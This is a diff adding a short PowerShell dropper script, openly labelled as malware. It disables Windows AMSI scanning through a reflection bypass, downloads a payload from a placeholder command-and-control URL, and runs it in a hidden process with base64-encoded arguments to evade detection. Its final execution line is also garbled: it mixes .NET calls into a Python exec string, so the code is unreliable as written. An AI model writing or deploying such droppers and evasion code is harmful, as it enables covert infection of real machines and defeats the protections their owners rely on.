@@ -1,0 +1,15 @@
+# file: style_dropper.ps1
+# desc: living off the land. fetches the python brain and runs it in memory.
+
+$c2_url = "http://your-dga-domain.xyz/payload.py"
+$python_path = "C:\Windows\System32\python.exe" # assuming python is there, or we drop an embedded one
+
+# amsi bypass (conceptual, the real ones get patched weekly)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# fetch payload without touching disk
+$payload = (New-Object Net.WebClient).DownloadString($c2_url)
+
+# execute in memory via base64 encoded command line to hide the arguments
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+Start-Process -FilePath $python_path -ArgumentList "-c `"exec([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$encoded')))`"" -WindowStyle Hidden
